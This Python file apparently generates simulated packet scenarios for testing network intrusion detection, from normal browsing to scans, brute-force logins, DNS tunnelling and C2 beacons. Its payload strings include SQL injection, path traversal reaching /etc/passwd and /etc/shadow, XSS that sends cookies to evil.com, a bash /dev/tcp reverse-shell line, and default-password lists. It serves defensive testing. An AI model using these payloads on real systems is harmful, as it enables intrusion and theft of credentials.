"""
Predefined traffic scenarios — each produces a list of simulated packets.
Packets are simplified abstractions, not real pcap data.
"""
from dataclasses import dataclass, field


@dataclass
class SimPacket:
    protocol: str
    src_ip: str
    src_port: int
    dst_ip: str
    dst_port: int
    payload: str
    flags: str = ""
    description: str = ""
    flow: str = "to_server"     # to_server | to_client | established


def build_scenario(
    scenario_id: str,
    attacker_ip: str,
    target_ip: str,
    home_ips: list[str],
    external_ips: list[str],
) -> list[SimPacket]:
    """
    Return a list of SimPackets for the given scenario.

    attacker_ip: resolved from the topology's attacker node
    target_ip:   the primary target device's IP (first connected non-attacker node)
    home_ips, external_ips: used for normal-browsing and DNS scenarios
    """
    builders = {
        "normal-browsing":    _normal_browsing,
        "nmap-syn-scan":      _nmap_syn_scan,
        "nmap-os-scan":       _nmap_os_scan,
        "udp-port-scan":      _udp_port_scan,
        "ping-sweep":         _ping_sweep,
        "nikto-scan":         _nikto_scan,
        "gobuster-scan":      _gobuster_scan,
        "ssh-brute-force":    _ssh_brute_force,
        "http-brute-force":   _http_brute_force,
        "ftp-brute-force":    _ftp_brute_force,
        "rdp-brute-force":    _rdp_brute_force,
        "sql-injection":      _sql_injection,
        "xss-probe":          _xss_probe,
        "lfi-attack":         _lfi_attack,
        "dns-tunneling":      _dns_tunneling,
        "http-c2-beacon":     _http_c2_beacon,
        "metasploit-handler": _metasploit_handler,
        "reverse-shell":      _reverse_shell,
    }

    builder = builders.get(scenario_id)
    if not builder:
        return []

    # internal_src is a non-target internal host for outbound scenarios
    internal_src = next(
        (ip for ip in home_ips if ip != target_ip),
        home_ips[0] if home_ips else "192.168.1.10",
    )
    return builder(attacker_ip, internal_src, target_ip)


def _normal_browsing(ext: str, src: str, dst: str) -> list[SimPacket]:
    return [
        SimPacket("dns", src, 54321, "8.8.8.8", 53, "example.com A?", description="DNS A record query"),
        SimPacket("tcp", src, 49512, dst, 80,  "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n", flags="PA", flow="to_server", description="Normal HTTP GET"),
        SimPacket("tcp", dst, 80,    src, 49512, "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n", flags="PA", flow="to_client", description="HTTP 200 response"),
        SimPacket("tcp", src, 49513, dst, 443, "TLS ClientHello", flags="S", flow="to_server", description="HTTPS connection"),
    ]


def _nmap_syn_scan(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = []
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
             1723, 3306, 3389, 5900, 8080, 8443, 8888, 9200, 27017]
    for port in ports:
        packets.append(SimPacket(
            "tcp", ext, 45000, dst, port,
            payload="",
            flags="S",
            flow="to_server",
            description=f"SYN probe → port {port}",
        ))
    return packets


def _ping_sweep(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = []
    base = ".".join(dst.split(".")[:3])
    for i in range(1, 20):
        host = f"{base}.{i}"
        packets.append(SimPacket(
            "icmp", ext, 0, host, 0,
            payload="\\x08\\x00 echo-request",
            flags="",
            description=f"ICMP echo request → {host}",
        ))
    return packets


def _ssh_brute_force(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = []
    for attempt in range(1, 12):
        packets.append(SimPacket(
            "tcp", ext, 50000 + attempt, dst, 22,
            payload=f"SSH-2.0-libssh attempt#{attempt}\r\npassword{attempt}",
            flags="PA",
            flow="established",
            description=f"SSH login attempt #{attempt}",
        ))
    return packets


def _http_brute_force(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = []
    creds = [("admin", "admin"), ("admin", "password"), ("root", "root"),
             ("user", "123456"), ("admin", "letmein"), ("admin", "welcome"),
             ("test", "test"), ("admin", "admin123"), ("admin", "qwerty"),
             ("admin", "password123"), ("admin", "abc123"), ("guest", "guest")]
    for user, pw in creds:
        packets.append(SimPacket(
            "tcp", ext, 51000, dst, 80,
            payload=f"POST /login HTTP/1.1\r\nHost: {dst}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername={user}&password={pw}",
            flags="PA",
            flow="established",
            description=f"HTTP POST /login user={user}",
        ))
    return packets


def _sql_injection(ext: str, src: str, dst: str) -> list[SimPacket]:
    return [
        SimPacket("tcp", ext, 52001, dst, 80,
            payload="GET /products?id=1' HTTP/1.1\r\nHost: " + dst + "\r\nUser-Agent: sqlmap/1.7\r\n",
            flags="PA", flow="established",
            description="SQL error probe with single quote"),
        SimPacket("tcp", ext, 52002, dst, 80,
            payload="GET /products?id=1+UNION+SELECT+null,username,password+FROM+users-- HTTP/1.1\r\nHost: " + dst + "\r\nUser-Agent: sqlmap/1.7\r\n",
            flags="PA", flow="established",
            description="UNION SELECT injection in URI"),
        SimPacket("tcp", ext, 52003, dst, 80,
            payload="GET /../../etc/passwd HTTP/1.1\r\nHost: " + dst + "\r\n",
            flags="PA", flow="established",
            description="Directory traversal attempt"),
        SimPacket("tcp", ext, 52004, dst, 80,
            payload="GET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: " + dst + "\r\n",
            flags="PA", flow="established",
            description="XSS script tag injection"),
    ]


def _dns_tunneling(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = []
    long_queries = [
        "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil-tunnel.com",
        "dGhpcyBpcyBiYXNlNjQgZW5jb2RlZCBkYXRh.evil-tunnel.com",
        "cGF5bG9hZCBjaHVuayAxMjM0NTY3ODkwYWJj.evil-tunnel.com",
    ]
    for i, query in enumerate(long_queries * 5):   # repeat to hit threshold
        packets.append(SimPacket(
            "udp", src, 54000 + i, "8.8.8.8", 53,
            payload=f"\\x00\\x10 TXT? {query}",
            flags="",
            description=f"DNS TXT query: {query[:30]}…",
        ))
    return packets


def _nmap_os_scan(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = [
        SimPacket("tcp", ext, 45100, dst, 80,  payload="", flags="S",   flow="to_server", description="SYN probe to open port (service banner grab)"),
        SimPacket("tcp", ext, 45101, dst, 80,  payload="GET / HTTP/1.0\r\nHost: " + dst + "\r\n\r\n", flags="PA", flow="to_server", description="HTTP/1.0 version probe"),
        SimPacket("tcp", ext, 45102, dst, 31337, payload="", flags="S", flow="to_server", description="SYN to closed port (RST expected — OS fingerprint)"),
        SimPacket("tcp", ext, 45103, dst, 80,  payload="", flags="",   flow="to_server", description="NULL probe (no TCP flags — OS fingerprint)"),
        SimPacket("tcp", ext, 45104, dst, 80,  payload="", flags="F",  flow="to_server", description="FIN probe — RFC violation used for OS detection"),
        SimPacket("tcp", ext, 45105, dst, 80,  payload="", flags="FPU", flow="to_server", description="XMAS probe (FIN+PSH+URG) — OS fingerprint"),
        SimPacket("tcp", ext, 45106, dst, 22,  payload="SSH-2.0-OpenSSH_probe\r\n", flags="PA", flow="to_server", description="SSH banner grab for version detection"),
        SimPacket("tcp", ext, 45107, dst, 3306, payload="\x00\x00\x00\x00", flags="PA", flow="to_server", description="MySQL handshake probe for version banner"),
    ]
    return packets


def _udp_port_scan(ext: str, src: str, dst: str) -> list[SimPacket]:
    udp_ports = [
        (53,   "DNS query probe"),
        (67,   "DHCP discover probe"),
        (69,   "TFTP read request probe"),
        (123,  "NTP version request probe"),
        (161,  "SNMP GetRequest probe"),
        (162,  "SNMP trap probe"),
        (500,  "IKE/ISAKMP probe"),
        (514,  "Syslog probe"),
        (520,  "RIP request probe"),
        (1194, "OpenVPN probe"),
        (1900, "UPnP SSDP probe"),
        (4500, "NAT-T IKE probe"),
        (5353, "mDNS probe"),
    ]
    return [
        SimPacket("udp", ext, 55000 + i, dst, port, payload="", flags="",
                  description=desc)
        for i, (port, desc) in enumerate(udp_ports)
    ]


def _nikto_scan(ext: str, src: str, dst: str) -> list[SimPacket]:
    paths = [
        "/",
        "/cgi-bin/test.cgi",
        "/admin/",
        "/phpMyAdmin/",
        "/wp-admin/",
        "/wp-login.php",
        "/.git/HEAD",
        "/server-status",
        "/etc/passwd",
        "/.htaccess",
        "/backup/",
        "/config.php",
        "/phpmyadmin/",
        "/robots.txt",
        "/sitemap.xml",
    ]
    return [
        SimPacket(
            "tcp", ext, 56000 + i, dst, 80,
            payload=f"GET {path} HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: Mozilla/5.0 (Nikto/2.1.6)\r\nConnection: keep-alive\r\n",
            flags="PA", flow="established",
            description=f"Nikto probe: GET {path}",
        )
        for i, path in enumerate(paths)
    ]


def _gobuster_scan(ext: str, src: str, dst: str) -> list[SimPacket]:
    dirs = [
        "/admin", "/api", "/api/v1", "/backup", "/config",
        "/.git", "/uploads", "/static", "/assets", "/images",
        "/login", "/dashboard", "/panel", "/manager", "/phpmyadmin",
        "/wp-content", "/includes", "/data", "/logs", "/tmp",
    ]
    return [
        SimPacket(
            "tcp", ext, 57000 + i, dst, 80,
            payload=f"GET {d} HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: gobuster/3.6\r\n",
            flags="PA", flow="established",
            description=f"Gobuster dir probe: GET {d}",
        )
        for i, d in enumerate(dirs)
    ]


def _ftp_brute_force(ext: str, src: str, dst: str) -> list[SimPacket]:
    creds = [
        ("admin", "admin"), ("admin", "password"), ("root", "root"),
        ("ftp", "ftp"), ("anonymous", ""), ("admin", "123456"),
        ("user", "user"), ("admin", "admin123"), ("root", "toor"),
        ("admin", "letmein"), ("upload", "upload"), ("test", "test"),
    ]
    packets = []
    for i, (user, pw) in enumerate(creds):
        packets.append(SimPacket(
            "tcp", ext, 58000 + i, dst, 21,
            payload=f"USER {user}\r\n",
            flags="PA", flow="established",
            description=f"FTP USER command: {user}",
        ))
        packets.append(SimPacket(
            "tcp", ext, 58000 + i, dst, 21,
            payload=f"PASS {pw}\r\n" if pw else "PASS \r\n",
            flags="PA", flow="established",
            description=f"FTP PASS attempt for user {user}",
        ))
    return packets


def _rdp_brute_force(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = []
    for attempt in range(1, 10):
        packets.append(SimPacket(
            "tcp", ext, 59000 + attempt, dst, 3389,
            payload=(
                f"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00"
                f"Cookie: mstshash=admin{attempt}\r\n"
            ),
            flags="PA", flow="to_server",
            description=f"RDP NLA negotiation attempt #{attempt}",
        ))
    return packets


def _xss_probe(ext: str, src: str, dst: str) -> list[SimPacket]:
    payloads = [
        ("/search?q=<script>alert(document.cookie)</script>",     "script tag XSS"),
        ("/search?q=<img src=x onerror=alert(1)>",               "img onerror XSS"),
        ("/search?q=javascript:alert(1)",                         "javascript: URI XSS"),
        ("/search?q=<svg onload=alert(1)>",                       "SVG onload XSS"),
        ("/comment?body=<script>fetch('http://evil.com?c='+document.cookie)</script>", "cookie exfil XSS"),
    ]
    return [
        SimPacket(
            "tcp", ext, 60000 + i, dst, 80,
            payload=f"GET {path} HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: Mozilla/5.0\r\n",
            flags="PA", flow="established",
            description=f"XSS probe: {label}",
        )
        for i, (path, label) in enumerate(payloads)
    ]


def _lfi_attack(ext: str, src: str, dst: str) -> list[SimPacket]:
    traversals = [
        ("/page?file=../../../../etc/passwd",          "/etc/passwd via 4x traversal"),
        ("/page?file=../../../etc/shadow",             "/etc/shadow via 3x traversal"),
        ("/page?file=/etc/passwd",                     "absolute /etc/passwd path"),
        ("/download?path=../../../../etc/hosts",       "/etc/hosts via download param"),
        ("/index.php?include=php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter wrapper LFI"),
        ("/view?file=....//....//....//etc/passwd",    "double-dot bypass LFI"),
    ]
    return [
        SimPacket(
            "tcp", ext, 61000 + i, dst, 80,
            payload=f"GET {path} HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: Mozilla/5.0\r\n",
            flags="PA", flow="established",
            description=f"LFI attempt: {label}",
        )
        for i, (path, label) in enumerate(traversals)
    ]


def _metasploit_handler(ext: str, src: str, dst: str) -> list[SimPacket]:
    # Victim (src/dst in simulation are internal; reverse connection goes dst→ext)
    packets = [
        SimPacket("tcp", dst, 49200, ext, 4444,
            payload="\x4d\x5a\x90\x00MSF stage request",
            flags="S", flow="to_server",
            description="Victim initiates reverse TCP to attacker:4444"),
        SimPacket("tcp", ext, 4444, dst, 49200,
            payload="\x4d\x5a\x90\x00\x03\x00\x00\x00Meterpreter stage 1 payload",
            flags="PA", flow="to_client",
            description="Attacker delivers Meterpreter stage 1"),
        SimPacket("tcp", dst, 49200, ext, 4444,
            payload="\x00\x00\x00\x00Meterpreter stage 2 ACK",
            flags="PA", flow="to_server",
            description="Victim acknowledges and loads stage 2"),
        SimPacket("tcp", ext, 4444, dst, 49200,
            payload="sysinfo\x00getuid\x00",
            flags="PA", flow="to_client",
            description="Meterpreter C2 command: sysinfo/getuid"),
        SimPacket("tcp", dst, 49200, ext, 4444,
            payload="Computer: victim-host\nOS: Linux\nUID: root",
            flags="PA", flow="to_server",
            description="Meterpreter response: system info"),
    ]
    return packets


def _reverse_shell(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = [
        SimPacket("tcp", dst, 49300, ext, 4444,
            payload="",
            flags="S", flow="to_server",
            description="Victim opens reverse TCP connection to attacker:4444"),
        SimPacket("tcp", ext, 4444, dst, 49300,
            payload="",
            flags="SA", flow="to_client",
            description="Attacker nc listener accepts connection"),
        SimPacket("tcp", dst, 49300, ext, 4444,
            payload="bash -i >& /dev/tcp/" + ext + "/4444 0>&1\n",
            flags="PA", flow="to_server",
            description="Bash reverse shell payload in TCP stream"),
        SimPacket("tcp", ext, 4444, dst, 49300,
            payload="id\nwhoami\ncat /etc/passwd\n",
            flags="PA", flow="to_client",
            description="Attacker issues shell commands over nc"),
        SimPacket("tcp", dst, 49300, ext, 4444,
            payload="uid=0(root) gid=0(root) groups=0(root)\nroot\n",
            flags="PA", flow="to_server",
            description="Shell command output: root access confirmed"),
    ]
    return packets


def _http_c2_beacon(ext: str, src: str, dst: str) -> list[SimPacket]:
    packets = []
    for i in range(8):
        packets.append(SimPacket(
            "tcp", src, 60000 + i, ext, 443,
            payload=(
                f"POST /check HTTP/1.1\r\n"
                f"Host: cdn-delivery.net\r\n"
                f"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
                f"Content-Length: 64\r\n\r\n"
                f"beacon_id=abc123&seq={i}"
            ),
            flags="PA",
            flow="to_server",
            description=f"C2 beacon #{i+1} with old Mozilla/4.0 UA",
        ))
    return packets
